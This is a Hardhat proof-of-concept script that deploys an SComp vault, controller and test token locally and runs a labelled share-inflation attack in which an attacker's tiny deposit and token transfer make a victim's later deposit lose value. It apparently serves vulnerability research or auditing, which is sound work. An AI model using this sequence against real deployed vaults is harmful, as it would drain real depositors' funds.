import {ethers} from "hardhat";
import {deployScompTask} from "../../01_task/sCompTask";

const hre = require("hardhat");

async function main() {
    // Setup Start
    const [attacker, victim] = await ethers.getSigners();

    const Controller = await hre.ethers.getContractFactory("SCompController");
    const [governance, strategist, rewards, dummy1] = await ethers.getSigners();
    const ControllerDeployed = await Controller.deploy(governance.address, strategist.address, rewards.address);
    console.log("Controller address : " + ControllerDeployed.address);

    const TestERC20 = await hre.ethers.getContractFactory("TestERC20");
    const TestERC20Deployed = await TestERC20.deploy("TestERC20", "TEST");
    console.log("TestERC20 Token address : " + TestERC20Deployed.address);
    await TestERC20Deployed.mint(attacker.address, 10000);
    await TestERC20Deployed.mint(victim.address, 10000);

    console.log("attacker TestToken balance : " + await TestERC20Deployed.balanceOf(attacker.address));
    console.log("victim TestToken balance : " + await TestERC20Deployed.balanceOf(victim.address));

    const Vault = await hre.ethers.getContractFactory("SCompVault");
    const VaultDeployed = await Vault.deploy(TestERC20Deployed.address, ControllerDeployed.address, dummy1.address, 0);
    console.log("Vault address : " + VaultDeployed.address);

    const InitialStrategyMockupDeployed = await deployScompTask.deployStrategy("nameStrategy", governance.address, governance.address, governance.address,
        TestERC20Deployed.address, TestERC20Deployed.address, 0, 0, 0, 0, 0,
        governance.address, 1, governance.address)

    console.log("InitialStrategyMockup address : " + InitialStrategyMockupDeployed.address);

    await ControllerDeployed.connect(governance).approveStrategy(TestERC20Deployed.address, InitialStrategyMockupDeployed.address);
    await ControllerDeployed.connect(governance).setStrategy(TestERC20Deployed.address, InitialStrategyMockupDeployed.address);

    await TestERC20Deployed.connect(attacker).approve(VaultDeployed.address, 10000);
    await TestERC20Deployed.connect(victim).approve(VaultDeployed.address, 10000);
    // Setup End

    // attack start
    console.log("attacker token balance before attack : " + await TestERC20Deployed.balanceOf(attacker.address));

    console.log("--- DEPOSIT ATTACKER: AMOUNT 1")
    await VaultDeployed.connect(attacker).deposit(1);
    console.log("------ Vault share attacker: " + await VaultDeployed.balanceOf(attacker.address));

    console.log("--- TRANSFER ATTACKER: AMOUNT 1000")
    await TestERC20Deployed.connect(attacker).transfer(governance.address, 1000);
    console.log("------ Attacker token balance after deposit and transfer: " + await TestERC20Deployed.balanceOf(attacker.address));

    console.log("--- DEPOSIT VICTIM: AMOUNT 2000")
    await VaultDeployed.connect(victim).deposit(2000);
    console.log("------ Vault share victim: " + await VaultDeployed.balanceOf(victim.address));

    console.log("--- WITHDRAW ATTACKER: AMOUNT 1")
    await VaultDeployed.connect(attacker).withdraw(1);
    console.log("------ Attacker token balance after attack : " + await TestERC20Deployed.balanceOf(attacker.address));
    console.log("------ Victim token balance after attack before withdraw: " + await TestERC20Deployed.balanceOf(victim.address));

    console.log("--- WITHDRAW VICTIM: AMOUNT 1")
    console.log("------ Vault share victim: " + await VaultDeployed.balanceOf(victim.address));
    await VaultDeployed.connect(victim).withdraw(2000);
    console.log("------ Victim token balance after attack after withdraw: " + await TestERC20Deployed.balanceOf(victim.address));
    console.log("------ Vault share victim : " + await VaultDeployed.balanceOf(victim.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
    console.error(error);
    process.exitCode = 1;
});
